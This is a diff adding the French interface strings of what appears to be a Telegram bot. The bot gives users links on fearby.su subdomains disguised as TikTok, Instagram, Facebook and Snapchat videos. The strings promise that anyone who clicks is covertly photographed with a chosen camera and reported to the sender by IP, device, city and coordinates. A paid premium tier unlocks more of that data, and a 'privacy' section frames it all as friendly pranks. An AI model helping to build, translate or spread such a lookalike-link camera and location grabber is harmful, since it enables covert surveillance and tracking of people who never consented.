@@ -1,0 +1,40 @@
+{
+    "subscription": "⛔️ <b>Pour continuer à utiliser le bot, veuillez vous abonner à la chaîne.</b>\n\n🔜 <b>Après vous être abonné à toutes les chaînes, envoyez la commande :</b> /start",
+    "start": {
+        "text": "🎉 <b>Voici vos liens de blague pour vos amis :</b>\n\n➖ <b>TikTok :</b> <code>https://tiktok.fearby.su/?video={{userToken}}{{mode}}</code>\n➖ <b>Instagram :</b> <code>https://instagram.fearby.su/?video={{userToken}}{{mode}}</code>\n➖ <b>Facebook :</b> <code>https://facebook.fearby.su/?video={{userToken}}{{mode}}</code>\n➖ <b>Reels :</b> <code>https://reels.fearby.su/?video={{userToken}}{{mode}}</code>\n➖ <b>Snapchat :</b> <code>https://snapchat.fearby.su/?video={{userToken}}{{mode}}</code>\n\n📸 <b>Dès que votre ami cliquera sur le lien — vous recevrez sa photo !</b>\n\n{{cameraText}}",
+        "keyboard": {
+            "getPremium": "🏆 Abonnement Premium",
+            "privacy": "🎭 Confidentialité",
+            "sharelink": "🔗 Envoyer à un ami",
+            "changeCamera": "📟 Changer de caméra"
+        },
+        "frontCamera": "📟 <b>Le bot prendra une photo avec la caméra frontale</b>",
+        "rearCamera": "📟 <b>Le bot prendra une photo avec la caméra arrière</b>"
+    },
+    "commandNotFound": "❗️Commande non trouvée.",
+    "back": "◀️ Retour",
+    "privacy": "🎭 <b>Confidentialité.</b>\n\n1) L'utilisation du bot est autorisée uniquement à des fins de blagues, d'éducation ou d'expérimentation.\n2) Il est interdit de partager le lien avec des inconnus - cela peut entraîner un blocage.\n3) Le bot et son site associé ne conservent que les informations minimales sur les utilisateurs : leur ID, leur langue et leur statut d'abonnement Premium.\n4) Le bot ne conserve pas les photos des utilisateurs : elles sont transmises via le site à un fichier temporaire et immédiatement envoyées au destinataire final.\n5) Il est strictement interdit de transmettre le lien avec des demandes qui violent les règles de Telegram ou les lois de votre pays (et de tout autre pays avec une législation civilisée).\n6) Un système de plaintes est mis en place dans le bot : si la photo reçue enfreint les règles, elle peut être envoyée pour vérification, et, en cas de confirmation de violation, l'IP de l'expéditeur sera bloquée.\n7) Le bot est créé pour des blagues amicales et des plaisanteries légères, et non pour des fins de piratage ou de révélation d'identités. Faites preuve de respect envers les autres utilisateurs et leur espace personnel.\n\n<b>En utilisant le bot, vous acceptez ces règles. Le non-respect peut entraîner un blocage.</b>",
+    "newPhoto": "❗️<b>Photo reçue via votre lien.</b>\n\n🌐 <b>IP :</b> <code>{{ip}}</code>\n📱 <b>Appareil :</b> <code>{{platform}}</code>\n🌃 <b>Ville :</b> <code>{{location}}</code>\n📍 <b>Coordonnées :</b> <code>{{coordinates}}</code>\n\n{{premium}}",
+    "complaint": "⛔️ Se plaindre",
+    "complaintSent": "☑️ Plainte envoyée avec succès !",
+    "paymentSent": "🎉 <b>Paiement reçu avec succès !</b>",
+    "hide": "caché",
+    "premiumSuccess": "🏆 <b>Les utilisateurs Premium débloqueront toutes les informations cachées et bien plus encore.</b>",
+    "premium": {
+        "text": "🏆 <b>Avantages Premium !</b>\n\n1) Choix de la caméra pour la photo. (avant ou arrière)\n2) Informations détaillées dans le message (celles qui sont cachées)\n3) Pas de restrictions\n\n🔑 <i>L'abonnement est payé pour 24 heures.</i>",
+        "keyboard": {
+            "pay": "⭐ Payer l'abonnement",
+            "getForFree": "👥 Obtenir gratuitement"
+        }
+    },
+    "referral": {
+        "text": "👥 <b>Bureau des références.</b>\n\n  • <b>Total invité :</b> <code>{{invitesCounter}}</code>\n  • <b>Points :</b> <code>{{points}}</code>\n\n🔗 <b>Votre lien :</b> <code>https://t.me/{{BOTNAME}}?start={{tgId}}</code>\n\n👉 Invitez des amis et gagnez des points qui pourront être échangés contre un abonnement premium.\n\n<b>Une fois que vous aurez invité 10 amis, vous pourrez échanger des points contre un abonnement premium.</b>",
+        "keyboard": {
+            "exchange": "♻️ Échanger contre un abonnement"
+        }
+    },
+    "exchange": {
+        "text": "🎊 <b>Vous avez échangé avec succès des points contre 24 heures d'abonnement !</b>",
+        "enoughtPoints": "😢 Pas assez de points. Invitez plus d'amis !"
+    }
+}
